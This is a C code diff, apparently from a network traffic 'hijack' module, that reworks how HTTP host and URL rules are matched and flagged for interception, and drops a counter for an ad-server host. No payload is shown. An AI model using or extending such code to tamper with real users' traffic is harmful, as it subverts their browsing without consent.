@@ -88,13 +88,13 @@ static  hijack_ip_t *ip_session_process(uint32_t ip)
 }
 
 
-static  berr hijack_rule_match(char *host, char *url, hijack_rule_t **rule)
+static  berr hijack_rule_match(hytag_t *hytag, hijack_rule_t **rule, uint8_t *hijack_flag)
 {
     int i;
     hijack_entry_t *ptr = NULL;
 
     ptr = api_get_hijack_table_ptr();
-    if ((NULL == ptr)||(NULL == rule) ||(NULL == host)||(NULL == url))
+    if ((NULL == ptr)||(NULL == rule) ||(NULL == hytag) || (NULL == hijack_flag))
     {
 	    return E_FAIL;
     }
@@ -108,18 +108,40 @@ static  berr hijack_rule_match(char *host, char *url, hijack_rule_t **rule)
         {
            	continue;			
         }
-        
-        if ((!strcmp(host, ptr[i].hijack.host)) || (!strncmp(url, ptr[i].hijack.key, strlen(ptr[i].hijack.key))) || (HIJACK_GLOBAL_MODE == ptr[i].hijack.mode))
-        {
-                //printf("i= %d, host=%s, index=%d\n", i , ptr[i].hijack.host, ptr[i].hijack.index);
-            //printf("url:%s., key:%s.\n", url, ptr[i].hijack.key);
-            *rule = &ptr[i].hijack;
-            return E_SUCCESS;
-        }
+
+		if (HIJACK_GLOBAL_MODE == ptr[i].hijack.mode)
+		{
+            *hijack_flag = HIJACK_GLOBAL_MODE;
+		}
+		else if ((HIJACK_KEY_MODE == ptr[i].hijack.mode) || (HIJACK_URL_MODE == ptr[i].hijack.mode))
+		{
+		     if (!strcmp(hytag->host, ptr[i].hijack.host))
+		     {
+                 *hijack_flag = HIJACK_KEY_MODE;
+		     }
+
+             if (HIJACK_URL_MODE == ptr[i].hijack.mode)
+             {
+				 if (!strncmp(hytag->url, ptr[i].hijack.key, strlen(ptr[i].hijack.key)))
+			     {
+	                 *hijack_flag = HIJACK_URL_MODE;
+			     }
+             }
+		}
         else
         {
             continue;
         }
+
+		if ( 0 != *hijack_flag)
+		{
+            *rule = &ptr[i].hijack;
+            return E_SUCCESS;  
+		}
+		else
+		{
+            continue;
+		}
 		
     }
     return E_NULL;
@@ -153,6 +175,8 @@ berr naga_hijack(hytag_t *hytag)
     time_t hijack_ip_time;
     uint64_t hijack_ip_time_gap = 0;
 
+	uint8_t hijack_flag = 0;
+
     hytag->match = 0;
 
 
@@ -182,7 +206,7 @@ berr naga_hijack(hytag_t *hytag)
         return E_SUCCESS;
     }
 
-    if (hytag->uri_len > 512)
+    if (hytag->url_len > 512)
     {
         CNT_INC(HIJACK_LONG_URI_DROP);
         return E_SUCCESS;
@@ -196,12 +220,7 @@ berr naga_hijack(hytag_t *hytag)
         return E_SUCCESS;
     }
 
-    if (!strcmp(hytag->host, "admartzone.com"))
-    {
-        CNT_INC(HIJACK_SERVER_HIT);
-    }
-
-    if(E_SUCCESS != hijack_rule_match((char *)hytag->host, (char *)hytag->url, &rule))
+    if(E_SUCCESS != hijack_rule_match(hytag, &rule, &hijack_flag))
     {
         CNT_INC(HIJACK_RULE_NOT_MATCH);
         return E_SUCCESS;
@@ -223,9 +242,7 @@ berr naga_hijack(hytag_t *hytag)
     }
     else
     {
-        //printf("url:%s., key:%s., size: %d\n", hytag->url, rule->key, strlen(rule->key));
-        //printf("url:%s., key:%s.\n", hytag->url, rule->key);
-        if (!strncmp(hytag->url, rule->key, strlen(rule->key)))
+        if ((HIJACK_GLOBAL_MODE == hijack_flag) || (HIJACK_URL_MODE == hijack_flag))
         {
             hytag->match |= HIJACK_LATER_OUR_FLAG; 
             ACL_PUSHED_ASSERT_HIT(rule->acl);
@@ -387,7 +404,7 @@ void hijack_table_reset()
     rv = api_hijack_ip_clear();
     if (E_SUCCESS != rv)
     {
-	printf("ip session table clear fail!\n");
+	    printf("ip session table clear fail!\n");
     }
 }
 
@@ -408,7 +425,7 @@ void *time_check_loop(void *parm)
             hijack_table_reset();
         }
         
-        sleep(2);
+        sleep(3);
     }
     return NULL;
 }
